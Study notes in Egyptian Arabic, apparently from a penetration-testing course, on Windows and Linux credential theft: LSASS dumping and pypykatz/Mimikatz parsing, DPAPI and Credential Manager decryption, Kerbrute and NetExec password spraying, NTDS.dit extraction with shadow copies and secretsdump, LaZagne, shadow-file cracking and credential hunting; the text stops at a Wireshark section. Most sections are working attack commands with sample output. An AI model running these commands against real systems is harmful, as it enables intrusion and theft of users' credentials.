- السرعة في Hashcat بتختلف على حسب نوع الهاش (NT أسرع من DCC2 بكتير جدًا).
    

---

# Layer 12
## **أولاً: LSASS يعني إيه؟**

**LSASS = Local Security Authority Subsystem Service**  
وده أهم بروسيس أمنية في ويندوز.

مسؤول عن:

- التوثيق Authentication
    
- حفظ الـ Credentials في الـ Memory
    
- إصدار الـ Tokens
    
- تشغيل MSV و Kerberos و WDigest
    
- حفظ DPAPI Master Keys
    
- كتابة Security Logs
    

يعني:

> لو عايز **تسرّب أي Credentials مهمة في النظام → هتهاجم LSASS.**

![[Pasted image 20251115001153.png]]


---

## **تانيًا: ليه بنهاجم LSASS؟**

لأن LSASS يخزن:

- NTLM hashes
    
- Plaintext passwords (لو WDigest enabled)
    
- Kerberos tickets (TGT/TGS)
    
- DPAPI masterkeys
    
- Cached logon sessions
    

يعني من الآخر:

> “لو مسكت dump من LSASS → كأنك ماسك الهارد كله.”

---

## **ثالثًا: طرق Dumping LSASS**

## **1️ Task Manager Method (GUI)**

لو ليك GUI على الجهاز:

**Right-click on LSASS → Create Dump File**  
بيطلع:

`%temp%\lsass.DMP`

تنقلها للـ attacker machine وتشتغل عليها.

---

## **2️ Rundll32 + comsvcs.dll Method (CLI)**

الأمر الكلاسيكي:

### 📌 الأول: هات الـ PID بتاع LSASS:

`tasklist /svc`

أو:

`Get-Process lsass`

هيظهر مثال زي:

`lsass.exe    672`

### 📌 بعدين نعمل Dump:

PowerShell:

`rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full`

⚠️ **90% من الـ Antivirus هيمنع الطريقة دي.**

---

## 🛰 **رابعًا: نقل الـ lsass.dmp للكالـي**

باستخدام:

- certutil
    
- python3 -m http.server
    
- SMB
    
- Powershell Base64
    
- netcat
    

زي أي File Transfer عادي.

---

## **خامسًا: استخراج الباسوردات باستخدام Pypykatz**

على الكالي:

`pypykatz lsa minidump lsass.dmp`

هيطلع كل الجلسات Sessions المخزّنة.

وتبدأ تشوف البروتوكولات:

```shell
[!bash!]$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp 

INFO:root:Parsing file /home/peter/Documents/lsass.dmp
FILE: ======== /home/peter/Documents/lsass.dmp =======
== LogonSession ==
authentication_id 1354633 (14ab89)
session_id 2
username bob
domainname DESKTOP-33E7O54
logon_server WIN-6T0C3J2V6HP
logon_time 2021-12-14T18:14:25.514306+00:00
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== DPAPI [14ab89]==
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605

== LogonSession ==
authentication_id 1354581 (14ab55)
session_id 2
username bob
domainname DESKTOP-33E7O54
logon_server WIN-6T0C3J2V6HP
logon_time 2021-12-14T18:14:25.514306+00:00
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354581
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
	== WDIGEST [14ab55]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
	== WDIGEST [14ab55]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)

== LogonSession ==
authentication_id 1343859 (148173)
session_id 2
username DWM-2
domainname Window Manager
logon_server 
logon_time 2021-12-14T18:14:25.248681+00:00
sid S-1-5-90-0-2
luid 1343859
	== WDIGEST [148173]==
		username WIN-6T0C3J2V6HP$
		domainname WORKGROUP
		password None
		password (hex)
	== WDIGEST [148173]==
		username WIN-6T0C3J2V6HP$
		domainname WORKGROUP
		password None
		password (hex)
```

---

## **سادسًا: تحليل الـ Output**

### **1️⃣ MSV (NTLM Hashes)**

ده أهم واحد.

هتلاقي:

`Username: bob NT: 64f12cddaa88057e06a81b54e73b949b SHA1: xxxxxxxxxxxxx`

➜ الـ NT Hash نقدر:

- نعمل بيه Crack
    
- نعمل Pass-the-Hash
    
- نفتح SMB / WinRM لو Enabled
    

---

### **2️⃣ WDigest (Plaintext Passwords)**

قديم ومشغل في Windows ≤ 8.1

لو Enabled:

`password: P@ssw0rd123`

😮 _ده Plaintext فعلي!_

لكن في Windows 10/11 **disabled by default**.

---

### **3️⃣ Kerberos**

يطلع:

- Tickets
    
- Session keys
    
- Credentials
    

مفيدة لـ:

- Pass-the-ticket
    
- Golden Ticket
    
- Kerberoasting
    

---

### **4️⃣ DPAPI**

هتلاقي:

`masterkey: e8bc2faf77e7e7......`

وده أهم حاجة لأنه:

> بيفتح كل Passwords مخزنة في البرامج (Chrome – RDP – Credentials Manager – Outlook – Wireless Keys).

---

## **سابعًا: كسر الـ NT Hash (Hashcat)**

أمر كسر NTLM:

`hashcat -m 1000 <hash> rockyou.txt`

المثال:

`64f12cddaa88057e06a81b54e73b949b:Password1`

تم فكّه ❤️

---

## **ثامنًا: ملخص كل ده (أهم حتة)**

|العنصر|بيدّيك إيه|الفائدة|
|---|---|---|
|**MSV**|NTLM + SHA1|Crack أو Pass the Hash|
|**WDigest**|Plain Password|Control كامل (لو Enabled)|
|**Kerberos**|التذاكر|Lateral Movement بسهولة|
|**DPAPI**|Master Keys|فك تشفير كل الباسوردات المخزنة|
|**masterkey**|مفتاح المستخدم|فتح Chrome/RDP/Manager passwords|

---

## أهم استفادة عملية:

لو لقيت NT hash →  
✔️ Crack  
✔️ smb exec  
✔️ winrm pass the hash

لو لقيت DPAPI masterkey →  
✔️ فك Chrome passwords  
✔️ فك RDP saved creds  
✔️ فك Credentials Manager

لو لقيت Kerberos tickets →  
✔️ Lateral movement  
✔️ Golden ticket attacks

# Layer 13
## أولًا: إيه هو Windows Credential Manager؟

ده مكان Windows بيخزن فيه:

- باسوردات الويب
    
- باسوردات الشبكات
    
- باسوردات RDP
    
- Tokens
    
- باسوردات السيرفيسز
    
- الدومين Credentials
    

يعني المستخدم لو حفظ Login لأي سيرفر → بيتخزن هنا.

**لكن… كل ده متشفر بـ DPAPI.**  
والـ DPAPI مبني على الـ user password + masterkey.

---

## 📌 فين بيتخزّنوا؟

الكرِدشانلز موجودين في ملفات مشفرة في:

`%UserProfile%\AppData\Local\Microsoft\Vault\ %UserProfile%\AppData\Local\Microsoft\Credentials\ %UserProfile%\Roaming\Microsoft\Vault\ %ProgramData%\Microsoft\Vault\ %SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\`

كل Vault folder فيه ملف مهم:

`Policy.vpol`

ده فيه الـ AES keys اللي بتشفر الباسوردات.

لكن عشان تفتحهم → لازم تفك تشفير DPAPI  
وده بنجيبه من **LSASS dump**.

---

## 🔥 ثانيًا: أنواع الـ Credentials

### 1) **Web Credentials**

بتاعة المواقع، IE، Edge القديم.

### 2) **Windows Credentials**

دي اللي تهمّك كـ atacante:

- RDP
    
- SMB
    
- Domain credentials
    
- OneDrive
    
- Shared folders
    
- RunAs saved creds
    

![[Pasted image 20251115004739.png]]

---

## ثالثًا: إزاي نعمل Enumeration للـ Credentials؟

### 📌 باستخدام cmdkey

`cmdkey /list`

هيديك كل الكريدنشالز المتخزنة:

مثال:

`Target: Domain:interactive=SRV01\mcharles Type: Domain Password User: SRV01\mcharles`

ده معناها:  
إن الجهاز حافظ باسورد يوزر **mcharles** على الدومين.

🔥 يعني إحنا نقدر نستعمله!

---

##  رابعًا: استخدام الكريدنشالز المحفوظة (بدون معرفة الباسورد)

باستخدام RunAs:

`runas /savecred /user:SRV01\mcharles cmd`

هيفتح CMD باليوزر ده _من غير ما يعطيك الباسورد_  
لأنه أصلا محفوظ.

اعمل:

`whoami`

هتلاقي نفسك:

`srv01\mcharles`

 **دي من أقوى الطرق لعمل Privilege Escalation أو Lateral Movement.**

---

## خامسًا: استخراج Credentials مخزّنة (Decrypt)

## الطريقة الأولى: عبر LSASS + sekurlsa::credman

### باستخدام Mimikatz:

`privilege::debug sekurlsa::credman`

هيطلع لك:

`Username : mcharles Domain   : SRV01 Password : <PLAIN TEXT PASSWORD>`
 ده بيحصل لأن Credential Manager بيخزن Session keys في LSASS  
ولو فتحت LSASS dump → تقدر تفك التشفير.

![[Pasted image 20251115005416.png]]

---

## الطريقة التانية: DPAPI (أقوى وأهم)

لو معاك:

- masterkey
    
- encrypted credential
    

تقدر تفك تشفير الباسورد حتى لو مفيش LSASS.

Using Mimikatz:

`dpapi::cred /in:"C:\Users\mohab\AppData\Local\Microsoft\Credentials\xxxx"`

Using SharpDPAPI:

`SharpDPAPI masterkeys SharpDPAPI credentials`

Using DonPAPI:

`donpapi <target>`

---

## ملخص الهجوم كله في 4 خطوات

### **1. Enumerate saved creds**

`cmdkey /list`

### **2. Use them without password**

`runas /savecred /user:<domain\user> cmd`

### **3. Dump LSASS**

`rundll32.exe comsvcs.dll, MiniDump <PID> lsass.dmp`

### **4. Extract Credential Manager data**

`sekurlsa::credman`

أو:

`dpapi::cred`

---

## الفكرة بشكل مبسط جدًا:

- Windows بيحفظ باسوردات في Credential Manager
    
- محمية بـ DPAPI
    
- DPAPI بيتفتح بالـ masterkey
    
- masterkey موجود في LSASS
    
- يبقى لو وقعت LSASS → تقدر تفك كل حاجة
    
- حتى RDP passwords — SMB — Domain creds

# Layer 14
## 🎯 **الفكرة العامة**

لما تخش على شبكة ويندوز فيها Active Directory، يبقى أهم هدفين عندك:

### 1️⃣ **تحصل على Credentials لأي يوزر**

زي (Password / Hash / Token)

### 2️⃣ **توصل لـ Domain Controller**

لأن عليه _كل حاجة_:

- كل اليوزرز
    
- كل الباسوردز (على شكل Hashes)
    
- ملفات الـ NTDS.dit، SYSTEM، SAM
    

---

## ✦ الجزء الأول: Dictionary Attack على AD

### ✔ الهدف:

تجرب عدد كبير من الباسوردات على يوزرات AD لحد ما تلاقي يوزر Valid + Password صحيحة.

### الأدوات:

- **Kerbrute** → نحدد الـ Valid Usernames
    
- **NetExec** (النسخة الجديدة من CrackMapExec)
    

---

##  _Step 1: نجيب Usernames_

تجمع أسماء الموظفين من LinkedIn – Facebook – PDF metadata – Emails.

### أمثلة فورمات اليوزرز:

|الشكل|مثال|
|---|---|
|firstinitiallastname|jdoe|
|firstname.lastname|jane.doe|
|lastname.firstname|doe.jane|
|nickname|jdoe2000|

تستخدم tool زي:

`username-anarchy`

```shell
./username-anarchy -i /home/ltnbob/names.txt
```
علشان يعمل لك list جاهزة بـ 20–30 فورمات مختلفة لكل اسم.

---

##  _Step 2: Enumerate Valid Usernames (Kerbrute)_

`./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local usernames.txt`

لو لقي Username valid يعطيك:

`[+] VALID USERNAME: bwilliamson`

---

## _Step 3: Brute Force Passwords (NetExec)_

`netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt`

لو الباسورد صح:

`[+] inlanefrieght.local\bwilliamson:P@55w0rd!`

---

## الجزء الثاني: NTDS.dit Dump

وده أهم جزء، لأنه لو جبت **NTDS.dit + SYSTEM** يبقى معاك كل باسوردات الـ Domain.
![[Pasted image 20251115012830.png]]

---

## 🎯 **إزاي توصل للـ NTDS؟**

لازم تكون:

- Local Administrator  
    أو
    
- Domain Admin
    

عشان تقدر تعمل Shadow Copy للـ C:\

---

##  Step 1: دخول على الـ Domain Controller

بـ Evil-WinRM:

`evil-winrm -i 10.129.201.57 -u bwilliamson -p 'P@55w0rd!'`

---

## 💡 Step 2: تأكد إن اليوزر Admin

`net user bwilliamson`

لو لقيت:

`Global Group memberships: Domain Admins Local Group Membership: Administrators`

يبقى انت ملك الشبكة خلاص 

---

## 💡 Step 3: Create Shadow Copy

`vssadmin CREATE SHADOW /For=C:`

هيديك VolumeShadowCopyX  
مثلاً:

`\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2`

---

## 💡 Step 4: Copy NTDS.dit

`cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\NTDS\NTDS.dit`

---

## 💡 Step 5: Move NTDS.dit إلى Attack Machine

`cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData`

---

## 💡 Step 6: Dump Hashes using secretsdump

`impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL`

هيطلع لك كل اليوزرز + NTLM Hashes.

---

## ✨ **الطريقة الأسرع كلها في سطر واحد (NetExec)**

`netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil`

الموديول:

`-M ntdsutil`

بيقوم بكل الخطوات:

- يعمل VSS
    
- يسحب NTDS
    
- يسحب SYSTEM
    
- يحلل الـ hashes
    
- ويعرضها مباشرة
    

---

# Layer 15
## Credential Hunting in Windows

**تعريف:**  
Credential Hunting 
هي عملية البحث التفصيلي على ملفات النظام والتطبيقات المختلفة لاكتشاف كلمات المرور أو بيانات الاعتماد.

**السيناريو:**  
لو حصلنا على وصول لجهاز Windows لموظف IT Admin عبر RDP، نقدر نبحث عن كلمات المرور باستخدام أدوات وطرق محددة بدل التخمين العشوائي.

---

### 1️⃣ البحث على أساس كلمات مفتاحية

**Key Terms للبحث:**

`Passwords, Passphrases, Keys, Username, User account, Creds, Users, Passkeys, configuration, dbcredential, dbpassword, pwd, Login, Credentials`

**أمثلة على طرق البحث:**

- **Windows Search:** استخدم شريط البحث للبحث عن ملفات أو إعدادات تحتوي على كلمات مفتاحية.
    
- **findstr:** للبحث داخل الملفات نصيًا:
    

`C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml`

---

### 2️⃣ استخدام أدوات لاكتشاف كلمات المرور

**LaZagne Tool:**

- أداة تجمع كلمات المرور المخزنة على الجهاز من متصفحات، تطبيقات محادثة، برامج بريد، إعدادات النظام، WiFi، أدوات Sysadmin، وغيرها.
    
- **أمثلة على الوحدات:**
    
    ![[Pasted image 20251115022257.png]]
    

**تشغيل LaZagne:**

`C:\Users\bob\Desktop> start LaZagne.exe all`

- يستخدم الخيار `-vv` لمشاهدة العمليات التي تتم خلف الكواليس.
    

**مثال النتيجة:**

`[+] Password found !!! URL: 10.129.202.51 Login: admin Password: SteveisReallyCool123 Port: 22`

---

### 3️⃣ أماكن شائعة للبحث عن كلمات المرور

- **SYSVOL share**: كلمات مرور في الـ Group Policy أو السكربتات.
    
- **IT shares**: سكربتات أو ملفات إعدادات.
    
- **web.config** على أجهزة التطوير و IT shares.
    
- **unattend.xml** و AD user/computer description fields.
    
- **KeePass databases** (بعد معرفة أو كسر كلمة المرور الأساسية).
    
- ملفات باسماء محتملة مثل `pass.txt`, `passwords.docx`, `passwords.xlsx` على الأجهزة أو الشبكة أو SharePoint.
    

---

### 4️⃣ نصائح عملية

- اختيار الأدوات والمفتاح البحثي يعتمد على نوع الجهاز: Windows Server vs Windows Desktop.
    
- لا تعتمد على التخمين العشوائي، بل ابحث استنادًا لاحتياجات مستخدم الجهاز وطريقة استخدامه.
    
- تأكد من فهم المكان الذي من المحتمل أن يخزن فيه المستخدم بيانات الاعتماد قبل البدء بالبحث.


# Layer 16


## **Linux Authentication Process – عملية تسجيل الدخول في لينكس**

لما تيجي تسجّل دخول على لينكس — سواء بكتابة الباسورد أو login من SSH — النظام بيعمل شوية خطوات معقدة تحت الهود علشان يتأكد إنك مستخدم حقيقي.

العملية دي اسمها **Authentication**.

## 🔹 أول حاجة: PAM (Pluggable Authentication Modules)

ده نظام في لينكس بيعتبره المسؤول عن:

- التحقق من الباسورد
    
- إدارة الجلسات (sessions)
    
- تغيير الباسورد
    
- التحكم في صلاحيات المستخدم
    

PAM عبارة عن **Modules** جاهزة، النظام بيسمّع عليها ويشغّلها حسب ما هو محتاج.

### 📌 مثال على Modules مهمة:

- **pam_unix.so**
    
- **pam_unix2.so**
    

المكان بتاع ملفات الموديولات دي عادةً:

```
/usr/lib/x86_64-linux-gnu/security/
```

### PAM بيتدخل إمتى؟

مثال:  
لما تكتب:

```
passwd
```

علشان تغيّر الباسورد، PAM هو اللي يفتح السكة ويقول للسيستم يخزّن الباسورد بشكل آمن.

---

## **/etc/passwd – ملف المستخدمين**

ده ملف مهم جدًا في لينكس، بيحتوي على **كل المستخدمين** في الجهاز.

- **الملف ده readable لكل الناس**  
    يعني أي حد يقدر يقرأه، بس مش أي حد يقدر يعدّل عليه.
    

شكل السطر فيه:

```
htb-student:x:1000:1000:,,,:/home/htb-student:/bin/bash
```

### ✨ شرح السطر ده بالتفصيل:

|الحقل|معناه|
|---|---|
|htb-student|اسم المستخدم|
|x|الباسورد (مش موجود هنا، مكانه في shadow)|
|1000|الـ User ID|
|1000|الـ Group ID|
|,,,|معلومات GECOS (اختيارية)|
|/home/htb-student|الهوم دايركتوري|
|/bin/bash|الشيل الافتراضي|

### ❗ المهم عندنا: حقل الباسورد

- لو لقيت **x** → يبقى الباسورد الحقيقي موجود في `/etc/shadow`
    
- لو لقيت **hash هنا** (قديماً) → يبقى ده خطير لأن الملف readable
    

### أخطر سيناريو:

لو حد بالغلط ادّى permission write للملف,  
ممكن تشيل كلمة الباسورد خالص:

```
root::0:0:root:/root:/bin/bash
```

ده معناه إن root **مفيهوش باسورد**.  
يقدر أي حد يكتب:

```
su
```

ويخش root مباشرة بدون باسورد.

---

## **/etc/shadow – ملف تخزين الباسورد الحقيقي**

ده الملف اللي فيه الباسورد **الهاش الحقيقي**، وده:

- **غير readable** لحد غير الـ root
    
- الصلاحيات عليه مقفولة جدًا
    

سطر منه بيبقى كده:

```
htb-student:$y$j9T$3QSBB6CbHEu...f8Ms:18955:0:99999:7:::
```

###  شرح حقول الملف:

| الحقل       | معناه                    |
| ----------- | ------------------------ |
| Username    | htb-student              |
| Password    | الهاش الكامل             |
| Last change | آخر مرة اتغير الباسورد   |
| Min age     | أقل مدة لتغيير الباسورد  |
| Max age     | أقصى مدة للباسورد        |
| Warning     | أيام قبل انتهاء الباسورد |
| Inactive    | بعد قد إيه يقف           |
| Expire date | الحساب هينتهي إمتى       |

###  حالات خطيرة:

- لو الباسورد فيه `!` أو `*` → مفيش login بباسورد ممكن يخش بكيربرس او Key 
    
- لو فاضي "" → الدخول بدون باسورد
    

###  شكل الهاش:

```
$<id>$<salt>$<hashed>
```

مثال:

```
$y$abc$saltandhash
```

### 🧠 الـ ID ده مهم لأنه بيوضح:

| ID  | الخوارزمية        |
| --- | ----------------- |
| 1   | MD5               |
| 5   | SHA-256           |
| 6   | SHA-512           |
| y   | Yescrypt (الأحدث) |
| 7   | Scrypt            |

معظم Linux الحديثة → تستخدم **yescrypt**

---

## **opasswd – ملف الباسوردات القديمة**

موجود في:

```
/etc/security/opasswd
```

PAM بيستخدمه علشان يمنع المستخدم إنه يكرر نفس الباسورد القديم أكتر من مرة.

شكل الملف:

```
cry0l1t3:1000:2:$1$HjFAfYTG$hash1,$1$kcUjWZJX$hash2
```

### ليه ده مهم للهجوم؟

- بيكشف باسوردات قديمة
    
- أحيانًا بيبقى بستخدم MD5 الضعيف
    
- المستخدمين غالبًا بيكرّروا الباسوردات نفس الشكل
    

---

## **Cracking Linux Credentials**

لو أخدت root access، تقدر تعمل الآتي:

### 1️⃣ تاخد نسخة من passwd و shadow:

```
sudo cp /etc/passwd /tmp/passwd.bak
sudo cp /etc/shadow /tmp/shadow.bak
```

### 2️⃣ تدمجهم باستخدام unshadow:

```
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```

### 3️⃣ تكسر الباسوردات عن طريق hashcat:

```
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```

### Note:

JtR
لديه مود اسمه _single mode_ معمول مخصوص للحالة دي.

---

## **ملخص بسيط**

|ملف|وظيفته|
|---|---|
|/etc/passwd|بيانات المستخدم (readable للجميع)|
|/etc/shadow|الهاش الحقيقي للباسوردات (root فقط)|
|PAM|النظام اللي بيعمل authentication|
|opasswd|الباسوردات القديمة|

---
# Layer 17
لما تدخل على سيستم لينكس (مثلاً عن طريق reverse shell من ثغرة ويب) أول حاجة بتدور عليها هي **credentials** — كلمات سر، مفاتيح SSH، توكنز، إلخ. دي "الفواكه اللي قدامك" اللي ممكن ترفع صلاحياتك بسرعة. الهدف هنا إنك تتعرّف على كل المصادر اللي ممكن تخبّي فيها creds وتعرف تفلتر وتفحص بسرعة.

---

## الفئات الأربع الأساسية للمصادر

1. **Files** — ملفات الكونفيج، سكربتات، قواعد بيانات، SSH keys، ملاحظات، إلخ.
    
2. **History & Logs** — command history، system/auth logs، application logs.
    
3. **Memory & Cache** — بيانات محفوظة في الذاكرة (process memory)، cache، متغيرات ENV.
    
4. **Keyrings & Browsers** — credential stores زي GNOME keyring، Firefox/Chrome saved passwords.
    

فحص كل فئة يزيد فرص إنك تلاقي شيء صالح للاستخدام.

---

## 1) Files — البحث عن ملفات فيها credentials

مبدأ مهم: في لينكس "كل حاجة ملف" — فدور على كل امتدادات ممكنة.

### أنواع مهمة من الملفات:

- **Configuration files**: .conf .config .cnf وأحيانًا ملفات بدون امتداد
    
- **Database files**: .sql .db _.db_
    
- **Notes / text**: .txt أو ملفات بدون امتداد
    
- **Scripts**: .sh .py .pl .jar .c ... لأن المطورين ساعات يحطوا credentials جوه سكربت
    
- **SSH keys**: ~/.ssh/id_rsa وغيرها
    
- **Cronjob scripts**: /etc/cron.* و /etc/crontab و /etc/cron.d/*
    





### أمثلة أوامر عملية مع تفسير

ابحث عن امتدادات الكونفيج:

```shell-session
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

- `find / -name *$l` : يدوّر في كل الشجرة على الملفات بالامتداد
    
- `2>/dev/null` : يخفي رسائل الخطأ (permission denied)
    
- `grep -v ...` : يستبعد مجلدات عامة عشان تقلل الضوضاء
    

لو لقيت ملفات .cnf ممكن تجرّب تـ grep على كلمات مفتاحية:

```shell
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib"); do   echo -e "\nFile: " $i   grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#" done
```
- بتدور على "user" أو "password" أو "pass"
    
- بتقص السطور المعلّقة `#`
    

البحث عن قواعد بيانات:

```shell
for l in $(echo ".sql .db .*db .db*"); do   echo -e "\nDB File extension: " $l   find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man" done
```

البحث عن ملاحظات وملفات نصية:

`find /home/* -type f -name "*.txt" -o ! -name "*.*"`

- الجزء `! -name "*.*"` بيطلع ملفات مالهاش امتداد (ممكن تكون notes)
    

البحث عن سكربتات:

```shell
for l in $(echo ".py .pyc .pl .go .jar .c .sh"); do   find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share" done
```

#### أمثلة لنتائج تستدعي انتباهك

- ملف `/etc/mysql/debian.cnf` يحتوي often على user/password لـ MySQL (خاصة لو دا سيرفر DB محلي)
    
- سكربت في `/etc/profile.d/` أو crontab بيشغل سكربت بـ credentials مكشوفة
    
- ملف `~/.ssh/id_rsa` أو keys في `/root/.ssh` — فوراً تديك SSH login
    

---

## 2) Cronjobs — ليه مهمين؟

الـ cron ممكن يشغّل سكربتات بصلاحيات root في أوقات دوريّة. لو السكربت فيه password أو ملف config، يبقى easy escalation.

`cat /etc/crontab ls -la /etc/cron.*/`

- دور على أي سكربتات في `/etc/cron.d/` أو `/etc/cron.daily/` إلخ
    
- افتح السكربت واقرأه — ممكن تلاقي DB creds أو مفاتيح للـ API
    

---

## 3) History files — command history

ملفات زي `~/.bash_history`, `~/.bashrc`, `~/.profile` مفيدة جداً. الناس ممكن يكونوا كتبوا أكواد أو كلمات سر أو استدعاء سكربت مع باراميتر فيه password.

مثال:

`tail -n5 /home/*/.bash*`

نتيجة زي:

`/tmp/api.py cry0l1t3 6mX4UP1eWH3HXK`

دي direct credential — سكربت اتشغل مع username/password كآرجومان

---

## 4) Logs — فين نلاقي hints؟

ملفات اللوجات في `/var/log/` مهمة: `auth.log`, `secure`, `syslog`, `dmesg`, `kern.log`, `faillog`, `cron`, `mysqld.log`, `httpd`...

بحث سريع عن كلمات مفتاحية:

```shell
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```

- دور على "accepted" (SSH accepted), "sudo" commands, "password changed" إلخ — دي بتكشف أنشطة مفيدة أو users جدد
    

---

## 5) Memory & Cache — استخراج من الذاكرة

بعض البرامج تخزن credentials في الذاكرة أو في cache. أدوات معروفة:

### Mimipenguin

- أداة بتهدف لاستخراج credentials من عمليات سطح المكتب والـ keyrings (مطلوب root)
    

`sudo python3 mimipenguin.py`

ممكن ترجع أسطر زي:

`[SYSTEM - GNOME] cry0l1t3:WLpAEXFa0SbqOHY`

يعني لقيت username:password مخزنين في الـ GNOME session.

### LaZagne

- أداة قوية بتستخرج creds من مصادر كتير: browsers, wifi, ssh, git, aws, docker, keepass، الخ.
    

`sudo python2.7 laZagne.py all # أو sudo python3 laZagne.py browsers`

هترجع لك أي كلمات سر مدعومة حسب المودولز اللي عندها.

---

## 6) Browser credentials — فين مخزنين وإزاي تستخرجهم

- Firefox: يخزن في `logins.json` مع تشفير، وملفات `key4.db` و `cert9.db` للمفاتيح
    
- Chrome/Chromium: في `Login Data` (SQLite) مع تشفير باستخدام OS keyring أو libsecret
    

مثال عرض `logins.json`:

`cat .mozilla/firefox/<profile>/logins.json | jq .`

بتشوف `encryptedUsername` و `encryptedPassword` و `hostname` و `timeCreated`...

#### أدوات لفك التشفير:

- **firefox_decrypt.py** (Python 3.9 مطلوب للنسخة الأحدث)
    

`python3.9 firefox_decrypt.py`

هيقلك الـ username/password صريح لو مفتاح الـ keyring متاح أو لو عندك صلاحيات المستخدم.

- LaZagne كمان بيستخرج browser passwords.
    

---

## نصايح عملية لما تلاقي creds

- جرّب الـ creds على الخدمات المحلية: SSH, MySQL, web admin panels, FTP, إلخ.
    
- لو لقيت private key، استخدمها للدخول عبر SSH:
    

`ssh -i id_rsa user@host`

- لو لقيت DB credentials، إفحص الوصول من الريموت:
    

`mysql -u user -p -h 127.0.0.1 -P 3306`

---

## أدوات مهمة مذكورة

- `find`, `grep`, `jq`, `tail`, `cat`, `ssh`
    
- **mimipenguin** — استخراج من session/keyrings
    
- **LaZagne** — استخراج من مصادر كتير
    
- **firefox_decrypt.py** — فك تشفير كلمات firefox
    
- (ملاحظة: لازم تستخدم الإصدارات المناسبة من Python لكل أداة)
    

---

## أمثلة real-world quick checklist (سريع للتنفيذ عند shell)

1. بحث ملفات كونفيج سريعة:
    

`find / -type f \( -name "*.conf" -o -name "*.cnf" -o -name "*.config" \) 2>/dev/null | head`

2. بحث عن كلمات "password" داخل الكونفيج:
    

`grep -R "password" /etc /home 2>/dev/null | head`

3. فحص history للمستخدمين:
    

`for u in /home/*; do echo "==> $u"; tail -n 50 $u/.bash_history 2>/dev/null; done`

4. فحص crontab:
    

`cat /etc/crontab ls -la /etc/cron.* /etc/cron.d 2>/dev/null`

5. فحص ملفات Firefox:
    

`ls -l ~/.mozilla/firefox/ cat ~/.mozilla/firefox/<profile>/logins.json | jq .`

---


# Layer 18

## أولًا: يعني إيه Credential Hunting في الشبكة؟

أنت كـ Attacker أو Penetration Tester بتدور على أي **Credentials (Usernames/Passwords)** بتعدي في الشبكة نص صريح (Cleartext).

النهارده معظم الناس بتستخدم:

- HTTPS بدل HTTP
    
- SSH بدل Telnet
    
- SNMPv3 بدل SNMPv1
    

لكن…

فيه 3 مشاكل:

1. **قديم systems (Legacy)** لسه بتستخدم بروتوكولات من غير تشفير.
    
2. **Misconfiguration** — حد مشغّل خدمة HTTP بدل HTTPS.
    
3. **Test environments** — مطوّر يشغّل السيرفر local بدون SSL.
    

الحاجات دي بتخلي الترافيك **واضح… وداخل فيه باسوردات وأسماء users**.

---

## ثانيًا: أشهر البروتوكولات اللي بتسرب Credentials

الجدول في النص بيقولك:

| Unencrypted    | Encrypted  | ليه خطير؟                                    |
| -------------- | ---------- | -------------------------------------------- |
| HTTP           | HTTPS      | الـ POST Forms بتبعت username/password واضحة |
| FTP            | FTPS/SFTP  | FTP بيسرب اليوزر والباسورد أول Session       |
| POP3/IMAP/SMTP | S-versions | إيميلات فيها authentication                  |
| SNMP v2        | SNMPv3     | Community string (زي الباسورد) في نص صريح    |
| LDAP           | LDAPS      | LDAP بيبعت credentials واضحة                 |

🔥 يعني لو حد دخل موقع login over HTTP → Wireshark هيجيب الباسورد قدّامك.

---

## ثالثًا: Wireshark — أداة الملك في الشبكات

Wireshark بيعرض لك كل packet ماشية في الشبكة.  
وهنا بقى الشغل الحقيقي.

## أهم Filters للبحث عن Credentials:

